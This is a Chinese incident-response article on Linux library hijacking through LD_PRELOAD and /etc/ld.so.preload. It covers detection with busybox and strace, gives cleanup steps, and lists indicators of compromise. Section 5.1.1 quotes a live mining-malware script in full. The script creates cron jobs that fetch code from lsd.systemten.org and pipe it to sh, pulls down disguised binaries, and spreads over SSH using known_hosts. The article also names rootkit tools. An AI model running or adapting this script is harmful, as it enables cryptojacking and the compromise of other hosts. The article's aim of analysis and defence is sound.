##  一、我与库文件劫持的前世今生

###  0x01 菜逼阶段

**Linux库文件劫持这种案例在今年的9月份遇到过相应的案例，当时的情况是有台服务器不断向个可疑IP发包，尝试建立连接，后续使用杀软杀出木马，重启后该服务器还是不断的发包，使用netstat、lsof等常用系统命令无法查看到相应的PID。这样的话就无法定位到相应的进程，协助处理，怀疑中了rootkit，使用rkhunter进行查杀，未杀出rootkit。以为是内核的问题导致无法查看到相应进程的PID，就没有深入分析。**

![](https://image.3001.net/images/20191219/1576743491_5dfb32435c024.jpg!small)![](https://image.3001.net/images/20191219/1576743491_5dfb324398adf.jpg!small)![](https://image.3001.net/images/20191219/1576743491_5dfb3243a6ba7.jpg!small)

###  0x02 持续菜逼

没过多久，内部同事也扔过来这样一个问题。也是通过netstat无法查看到相应的PID，同事怀疑中了木马，但是使用rkhunter等工具未查出异常，以为情况和前期一样，也没有深入分析与研究。

![](https://image.3001.net/images/20191219/1576743530_5dfb326aa964b.jpg!small)

![](https://image.3001.net/images/20191219/1576743530_5dfb326ab2631.jpg!small)![](https://image.3001.net/images/20191219/1576743530_5dfb326ad6ca2.jpg!small)

###  0x03 深入学习与了解原理

大概过了一个月，内部同事也遇到相同的问题，协助处置，经过学习与分析，发现前期自己的思路完全错误了，以为是内核问题导致的netstat无法查看到PID，并且前期太依赖工具(rootkit)的查杀结果，其实是库文件劫持导致的情况。深入学习与分析后，便有了今天这篇文章。将在处置与分析过程中遇到的各种坑同步给经常做应急的小伙伴，防止后期连续踩坑。

![](https://image.3001.net/images/20191219/1576743560_5dfb3288d9888.jpg!small)![](https://image.3001.net/images/20191219/1576743560_5dfb3288e90e5.jpg!small)![](https://image.3001.net/images/20191219/1576743561_5dfb32890ef16.jpg!small)

##  二、库文件劫持原理

前期有大佬做个这个案例的分析，感兴趣的小伙伴可以学习一下，个人感觉总结的非常全面。

> <https://www.freebuf.com/column/162604.html>

引用里面的一张图，Linux动态预加载的流程如下:

![](https://image.3001.net/images/20191219/1576743583_5dfb329f32b00.jpg!small)

> 1\. 应用程序在通过系统接口调用内核时会预先加载动态链接库,
> 即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动态链接库依然会被加载。
>
> 2\. 这个库里面主要包括两个内容:LD_PRELOAD和/etc/ld.so.preload
>
> 3\. LD_PRELOAD用于预加载环境变量
>
> 4\. /etc/ld.so.preload用于预加载配置文件
>
> 5\. 默认情况下LD_PRELOAD和/etc/ld.so.preload无配置
>
> 6\.
> 动态编译:不论程序依赖不依赖动态链接库，都会加载LD_PRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动态链接库依然会被装载
>
> 7\.
> 静态编译:不动态加载系统库文件,直接将程序所需要的各种文件全部集中到该软件平台中，这样就可以解决系统库文件被劫持，中了rootkit等导致连接、网络等被隐藏的情况，常用的工具如busybox

##  三、库文件劫持技术

前文可以看到Linux预加载的配置文件主要有两个:LD_PRELOAD和/etc/ld.so.preload，因此针对Linux的库文件劫持可以围绕这两个进行展开，目前主流的劫持技术主要有三种:

> 更改LD_PRELOAD环境变量，加载恶意库文件
>
> /etc/ld.so.preload加载恶意的库文件(主流的劫持技术)
>
> 更改默认的库文件/etc/ld.so.preload为其他库文件

其中第二条是目前遇到的最多的，其主要是通过更改/etc/ld.so.preload来预加载其他恶意的库文件来实现对系统命令，如netstat、cat、top等进行劫持，从而到达隐藏进程、连接、性能等目的，这种也是rootkit典型的技术。

###  3.1LD_PRELOAD劫持

**3.1.1 劫持实现**

这种劫持实现相对较简单，可以通过以下方法来实现:

> 1\. LD_PRELOAD=/lib/f1c8d7.so
>
> 将LD_PRELOAD的值设置为要预加载的动态链接库
>
> 2\. export LD_PRELOAD
>
> 导出环境变量使该环境变量生效
>
> 3.一般情况下相关的库文件会被加上隐藏属性

![](https://image.3001.net/images/20191219/1576743601_5dfb32b1d18bd.jpg!small)

**3.1.2 如何检测**

1.因为是通过更改环境变量实现的加载恶意库文件，因此可以直接查看环境变量，简单效果好，echo $LD_PRELOAD即可查看到是否存在劫持

![](https://image.3001.net/images/20191219/1576743611_5dfb32bb9ca2d.jpg!small)

2.根据Linux的预加载机制，相应的系统命令都会加载LD_PRELOAD环境变量指定的内容，因此可以通过strace来跟踪相应系统命令加载的库文件来分析，我们知道Linux预加载就两个LD_PRELOAD和/etc/ld.so.preload，下面可以看到对/bin/ls进行跟踪发现其打开了/lib/f1c8d7.so，同时提示没有

/etc/ld.so.preload这个文件，因此可以判断是通过环境变量实现劫持的。

![](https://image.3001.net/images/20191219/1576743660_5dfb32ec398d9.jpg!small)

###  3.2 /etc/ld.so.preload劫持

**3.2.1 如何实现**

这种劫持方式是目前遇到的最多的也是最主流的劫持方式，其主要是修改其配置，将其加载一个恶意的库文件来实现劫持。这里面可以使用github里面的工具来实现，详细可参考:

> <https://github.com/mempodippy/cub3>

**3.2.2 劫持分析**

使用cat无法查看相应的内容；使用busybox可以看到相应的内容，说明存在库劫持。并且其类型是修改/etc/ld.so.preload内容，增加恶意库文件实现劫持。

![](https://image.3001.net/images/20191219/1576743677_5dfb32fdb9a49.jpg!small)

**3.2.3 cub3.so内容**

使用strings查看cub3.so内容

![](https://image.3001.net/images/20191219/1576743698_5dfb3312b6f97.jpg!small)![](https://image.3001.net/images/20191219/1576743699_5dfb33131e48c.jpg!small)![](https://image.3001.net/images/20191219/1576743699_5dfb33133062b.jpg!small)

**3.2.4 调试跟踪**

由于cat命令被劫持了，因此我们可以使用strace来追踪/bin/cat命令的加载情况，可以看到其访问/etc/ld.so.preload，并且打开了/lib/cub3.so这个库文件。

![](https://image.3001.net/images/20191219/1576743716_5dfb3324af25b.jpg!small)

**3.2.5 如何处置**

去掉隐藏属性

![](https://image.3001.net/images/20191219/1576743728_5dfb3330dce36.jpg!small)

chattr -ia/etc/ld.so.preload

![](https://image.3001.net/images/20191219/1576743740_5dfb333cc2a99.jpg!small)

rm -rf/etc/ld.so.preload /lib/cub3.so

![](https://image.3001.net/images/20191219/1576743752_5dfb3348b5590.jpg!small)

###  3.3 修改动态链接器劫持分析

**3.3.1 如何实现**

正常情况下，相关的系统功能会默认调用/etc/ld.so.preload这个库文件，但是也存在这个默认库文件被修改的情况，所以我们需要分析相关系统命令默认调用的库文件来分析其是否被修改。

正常情况下，相关系统命令调用的默认库文件可以通过strace命令来追踪，其如下所示：

    
    
    strace -f -e trace=file /bin/ls

可以看到，其默认调用的是/etc/ld.so.preload这个库文件:

![](https://image.3001.net/images/20191219/1576743767_5dfb3357b4a94.jpg!small)

下面我们来修改这个默认库文件实现劫持来分析:

> 劫持使用的脚本为:<https://github.com/mempodippy/vlany>

![](https://image.3001.net/images/20191219/1576743789_5dfb336d86bb8.jpg!small)![](https://image.3001.net/images/20191219/1576743789_5dfb336daa6d2.jpg!small)![](https://image.3001.net/images/20191219/1576743789_5dfb336db9e18.jpg!small)

创建后门账号test1

![](https://image.3001.net/images/20191219/1576743818_5dfb338a5a241.jpg!small)![](https://image.3001.net/images/20191219/1576743818_5dfb338a759cb.jpg!small)![](https://image.3001.net/images/20191219/1576743818_5dfb338a87e54.jpg!small)![](https://image.3001.net/images/20191219/1576743818_5dfb338aeae68.jpg!small)![](https://image.3001.net/images/20191219/1576743819_5dfb338b18dc0.jpg!small)

**3.3.2 功能分析**

通过其官方说明里可以看到，其特征就是rootkit的典型特征，具有隐藏进程、用户、网络、后门等。

![](https://image.3001.net/images/20191219/1576743842_5dfb33a218143.jpg!small)

**3.3.3 劫持分析**

正常情况下，我们可以看到其默认加载的库为/etc/ld.so.preload

![](https://image.3001.net/images/20191219/1576743854_5dfb33ae85ef4.jpg!small)

安装完相应的恶意程序以后，其默认库文件被修改为/bin/.Kv8Xqykz,这个时候相关的默认库被修改了

![](https://image.3001.net/images/20191219/1576743867_5dfb33bb7c0c7.jpg!small)

**3.3.4 如何处置**

> 1.直接随便写一个库文件到/etc/ld.so.preload中
>
> 2.然后再删除/etc/ld.so.preload就可以了

![](https://image.3001.net/images/20191219/1576743896_5dfb33d821bd7.jpg!small)

##  四、如何检测库文件劫持

前面我们看到针对Linux的库文件劫持，常用的方法就三种:

> 更改LD_PRELOAD环境变量，加载恶意库文件
>
> /etc/ld.so.preload加载恶意的库文件(主流的劫持技术)
>
> 更改默认的库文件/etc/ld.so.preload为其他库文件

因此，检测这一块也是针对性的进行检测

###  4.1分析LD_PRELOAD环境变量

比较简单，直接echo$LD_PRELOAD即可查看是否存在针对环境变量的劫持行为。这里就不再赘述。

###  4.2 静态查看与动态查看对比检测

原理比较简单，就是使用系统命令与静态工具，如busybox执行的命令进行对比，如果结果一致，这里面就不存在劫持。如果不一致就可能存在劫持。一般情况下，这种针对库文件的劫持会针对所有的系统命令进行劫持，因此我们可以随便选择一个系统命令，通过执行系统命令与使用busybox静态执行的命令进行对比即可发现是否存在劫持，详细实现如下:

![](https://image.3001.net/images/20191219/1576743912_5dfb33e838741.jpg!small)

###  4.3 使用strace进行动态跟踪

strace可用来跟踪相应的库文件加载情况，这种方式是相对靠谱的方式。若担心strace这个命令被替换或被植入rootkit可以使用busybox来执行该命令。

**4.3.1 分析LD_PRELOAD环境变量劫持**

根据Linux的预加载机制，相应的系统命令都会加载LD_PRELOAD环境变量指定的内容，因此可以通过strace来跟踪相应系统命令加载的库文件来分析，我们知道Linux预加载就两个LD_PRELOAD和/etc/ld.so.preload，下面可以看到对/bin/ls进行跟踪发现其打开了/lib/f1c8d7.so，同时提示没有

/etc/ld.so.preload这个文件，因此可以判断是通过环境变量实现劫持的。

![](https://image.3001.net/images/20191219/1576743925_5dfb33f5551f8.jpg!small)

**4.3.2 分析/etc/ld.so.preload库文件劫持**

由于cat命令被劫持了，因此我们可以使用strace来追踪/bin/cat命令的加载情况，可以看到其访问/etc/ld.so.preload，并且打开了/lib/cub3.so这个库文件。

![](https://image.3001.net/images/20191219/1576743945_5dfb3409314dc.jpg!small)

**4.3.3 分析修改默认动态链接器来实现劫持**

使用strace进行跟踪可以看到其默认库文件被修改为/bin/.Kv8Xqykz,这个时候相关的默认库被修改了

![](https://image.3001.net/images/20191219/1576743958_5dfb3416afd70.jpg!small)

###  4.4 github脚本

Github上有大佬放了用来检测库文件劫持的脚本，相应的脚本地址如下:

> <https://github.com/mempodippy/detect_preload>

##  五、遇到的Linux库文件劫持案例

###  5.1现象

**5.1.1 定时任务**

系统被植入定时任务，但是通过crontab–r无法删除

![](https://image.3001.net/images/20191219/1576743972_5dfb34244ce43.jpg!small)

相应的C2地址为lsd.systemten.org，通过微步在线查看其已被标识为远控、挖矿木马。

![](https://image.3001.net/images/20191219/1576743993_5dfb34395650c.jpg!small)

相应的脚本如下:

    
    
    exportPATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin
    
        mkdir -p /tmp
    
        chmod 1777 /tmp
    
        echo "*/10 * * * * (curl-fsSL -m180 lsd.systemten.org||wget -q -T180 -O- lsd.systemten.org||python -c'import urllib;printurllib.urlopen(\"[http://lsd.systemten.org](http://lsd.systemten.org/)\").read()')|sh"|crontab- cat > /etc/crontab <<EOF
    
        SHELL=/bin/bash
    
        PATH=/sbin:/bin:/usr/sbin:/usr/bin
    
        */10 * * * * root (curl -fsSL-m180 lsd.systemten.org||wget -q -T180 -O- lsd.systemten.org||python -c 'importurllib;printurllib.urlopen("[http://lsd.systemten.org](http://lsd.systemten.org/)").read()'||/usr/local/sbin/638b6d9fb883b8)|sh
    
        EOF
    
        find /etc/cron*|xargs chattr -i
    
        find /var/spool/cron*|xargschattr -i
    
        grep -RE "(wget|curl)"/etc/cron*|grep -v systemten|cut -f 1 -d :|xargs rm -rf
    
        grep -RE"(wget|curl)" /var/spool/cron*|grep -v systemten|cut -f 1 -d :|xargsrm -rf
    
        cd /tmp
    
        touch /usr/local/bin/writeable&& cd /usr/local/bin/
    
        touch /usr/libexec/writeable&& cd /usr/libexec/
    
        touch /usr/bin/writeable&& cd /usr/bin/
    
        rm -rf /usr/local/bin/writeable/usr/libexec/writeable /usr/bin/writeable
    
        export PATH=$PATH:$(pwd)
    
        a64="img.sobot.com/chatres/89/msg/20191022/78e3582c42824f17aba17feefb87ea5f.png"
    
        a32="img.sobot.com/chatres/89/msg/20191022/2be662ee79084035914e9d6a6d6be10d.png"
    
        b64="cdn.xiaoduoai.com/cvd/dist/fileUpload/1571723350789/0.25579108623802416.jpg"
    
        b32="cdn.xiaoduoai.com/cvd/dist/fileUpload/1571723382710/9.915787746614242.jpg"
    
        c64="<https://user-images.githubusercontent.com/56861392/67261951-83ebf080-f4d5-11e9-9807-d0919c3b4b74.jpg>"
    
        c32="<https://user-images.githubusercontent.com/56861392/67262078-0aa0cd80-f4d6-11e9-8639-63829755ed31.jpg>"
    
        if [ ! -f"638b6d9fb883b8" ]; then
    
            ARCH=$(getconf LONG_BIT)
    
            if [ ${ARCH}x = "64x" ]; then
    
                (curl -fsSL -m180 $a64 -o638b6d9fb883b8||wget -T180 -q $a64 -O 638b6d9fb883b8||python -c 'importurllib;urllib.urlretrieve("http://'$a64'","638b6d9fb883b8")'||curl -fsSL -m180 $b64 -o 638b6d9fb883b8||wget-T180 -q $b64 -O 638b6d9fb883b8||python -c 'importurllib;urllib.urlretrieve("http://'$b64'","638b6d9fb883b8")'||curl -fsSL -m180 $c64 -o 638b6d9fb883b8||wget-T180 -q $c64 -O 638b6d9fb883b8||python -c 'import urllib;urllib.urlretrieve("'$c64'","638b6d9fb883b8")') 
    
            else
    
                (curl -fsSL -m180 $a32 -o638b6d9fb883b8||wget -T180 -q $a32 -O 638b6d9fb883b8||python -c 'importurllib;urllib.urlretrieve("http://'$a32'","638b6d9fb883b8")'||curl -fsSL -m180 $b32 -o 638b6d9fb883b8||wget-T180 -q $b32 -O 638b6d9fb883b8||python -c 'importurllib;urllib.urlretrieve("http://'$b32'","638b6d9fb883b8")'||curl -fsSL -m180 $c32 -o 638b6d9fb883b8||wget-T180 -q $c32 -O 638b6d9fb883b8||python -c 'import urllib;urllib.urlretrieve("'$c32'","638b6d9fb883b8")')
    
            fi
    
        fi
    
        chmod +x 638b6d9fb883b8
    
        $(pwd)/638b6d9fb883b8 ||./638b6d9fb883b8 || /usr/bin/638b6d9fb883b8 || /usr/libexec/638b6d9fb883b8 ||/usr/local/bin/638b6d9fb883b8 || 638b6d9fb883b8 || /tmp/638b6d9fb883b8 ||/usr/local/sbin/638b6d9fb883b8
    
        if [ -f /root/.ssh/known_hosts] && [ -f /root/.ssh/id_rsa.pub ]; then
    
          for h in $(grep -oE"\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh-oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "(curl-fsSL lsd.systemten.org||wget -q -O- lsd.systemten.org||python -c 'importurllib;print urllib.urlopen(\"[http://lsd.systemten.org](http://lsd.systemten.org/)\").read()')|sh>/dev/null 2>&1 &" & done
    
        fi
    
        for file in /home/*
    
        do
    
            if test -d $file; then
    
                if [ -f $file/.ssh/known_hosts ]&& [ -f $file/.ssh/id_rsa.pub ]; then
    
                    for h in $(grep -oE"\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $file/.ssh/known_hosts); do ssh-oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "(curl-fsSL lsd.systemten.org||wget -q -O- lsd.systemten.org||python -c 'importurllib;print urllib.urlopen(\"[http://lsd.systemten.org](http://lsd.systemten.org/)\").read()')|sh>/dev/null 2>&1 &" & done
    
                fi
    
            fi
    
        done
    
        #

**5.1.2 本地文件**

同时使用rm -rf命令也无法删除相应的文件

![](https://image.3001.net/images/20191219/1576744011_5dfb344b5a05d.jpg!small)

**5.1.3 网络连接**

通过分析网络连接，发现了和前期遇到相同的情况，看不到PID

![](https://image.3001.net/images/20191219/1576744028_5dfb345cea912.jpg!small)

**5.1.4 性能分析**

既然是挖矿其CPU肯定会被利用的非常多，但是我们使用TOP命令来看，其CPU利用率非常低，完全看不出有问题。

![](https://image.3001.net/images/20191219/1576744046_5dfb346ec1935.jpg!small)

###  5.2分析

**5.2.1 busybox分析**

有了前面分析的基础，这个时候我们再去处置这个问题就相对简单了。Linux库文件劫持这块如果找不对方向处置的话会很头疼，明白了原理和手法以后再去分析就相对简单了。

直接上神器busybox，可以看到两个PID(104110和104025)占了98%以上的CPU

![](https://image.3001.net/images/20191219/1576744062_5dfb347e615fd.jpg!small)

同时，使用busybox查看netstat可以看到前面没有看到的PID主要为104025。个人推测:PID为104110主要是用来进行挖矿的;104025主要是用来进行和矿池通信、分发任务等功能。

![](https://image.3001.net/images/20191219/1576744075_5dfb348b1e10e.jpg!small)

**5.2.2 库文件劫持分析**

直接使用buxybox查看，可以看到/etc/ld.so.preload加载了下面这个库文件/usr/local/lib/libEGID.so，这个库文件肯定是用来进行劫持使用的恶意库文件。

![](https://image.3001.net/images/20191219/1576744088_5dfb349825727.jpg!small)

###  5.3 处置

上面可以看到该恶意程序的功能如下:

> 1\. 库文件劫持
>
> 2\. 创建定时任务
>
> 3\. 禁止删除文件
>
> 4\. 创建恶意进程
>
> 5\. 网络外连

因此处置主要是根据上面的行为来进行针对性的处置，处置的前提是要收集好具体的恶意行为，如创建了哪些定时任务、生成了哪些恶意进程等。网上有人写了相应的脚本，我们在处置的时候可以参考相应的脚本，但是里面的进程可能不是脚本里面的进程、恶意的文件目录也可能不是脚本里面的，我们需要根据遇到的具体情况来进行更新与完善，相关的核心点如下:

**5.3.1 删除定时任务**

![](https://image.3001.net/images/20191219/1576744099_5dfb34a3ca3bf.jpg!small)

**5.3.2 删除异常进程**

![](https://image.3001.net/images/20191219/1576744111_5dfb34af0e0a8.jpg!small)

**5.3.3 修复动态库**

![](https://image.3001.net/images/20191219/1576744121_5dfb34b963194.jpg!small)

**5.3.4 修复启动项**

![](https://image.3001.net/images/20191219/1576744132_5dfb34c4afacd.jpg!small)

###  5.4 总结

库文件劫持这种技术平时遇到的相对较少，但是在freebuf上搜了一下，从18年开始就流行了，平时如果没有这方面的积累，遇到以后还是难以处理。这篇文章相当于给大家扫盲，了解了其原理以后再去处置就会得心应手。

##  六、LOCs

###  6.1IP

> 121.237.8.28
>
> 121.237.8.29
>
> 121.237.8.31
>
> 121.237.8.33
>
> 121.237.8.35
>
> 121.237.8.36
>
> 121.237.8.38
>
> 121.237.8.41
>
> 121.237.8.42
>
> 121.237.8.47
>
> 121.237.8.48
>
> 121.237.8.50

###  6.2 域名

> lsd.systemten.org
>
> aliyun.one

###  6.3 MD5

> 6e734be6192fc688421641fee6b06c01

 ***本文原创作者：feiniao，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

